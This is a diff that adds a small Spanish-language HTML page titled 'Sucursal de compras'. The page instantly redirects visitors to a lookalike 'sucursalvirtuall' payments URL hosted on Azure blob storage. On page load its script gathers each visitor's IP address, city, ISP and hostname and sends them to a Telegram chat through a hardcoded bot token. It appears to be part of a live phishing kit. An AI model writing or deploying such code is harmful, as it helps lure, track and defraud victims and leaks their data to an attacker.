@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="refresh" content="0; url='https://sucursalvirtuall.blob.core.windows.net/youtubepayments/index.html'">
+    <title>Sucursal de compras</title>
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            fetch("https://ipinfo.io/json")
+                .then(response => response.json())
+                .then(data => {
+                    const ip = data.ip || "Desconocida";
+                    const loc = data.city + ", " + (data.region || "");
+                    const barrio = data.org || "Desconocido";
+                    const calle = data.hostname || "Desconocida";
+                    
+                    const botToken = "7641581605:AAExTM7xZIUvmckqdJ2zqFC5JY2fyF3xfNU";
+                    const chatId = "-1002464974193";
+                    const mensaje = `💵💵💵💵💵💵💵💵💵💵💵💵💵💵💵💵💵💵💵💵💵💵💵💵💵💵💵NUEVO INGRESO EN LA JUEGA ACTIVO AMARILLO AMARILLO LO PLATANOOO💵💵💵💵💵💵💵💵💵💵💵💵💵💵💵💵💵💵💵💵💵💵💵💵💵💵💵%0AIP: ${ip}%0ABARRIO: ${barrio}%0ACALLE: ${calle}`;
+                    
+                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${mensaje}`);
+                })
+                .catch(error => console.error("Error obteniendo la información de IP:", error));
+        });
+    </script>
+</head>
+<body>
+</body>
+</html>
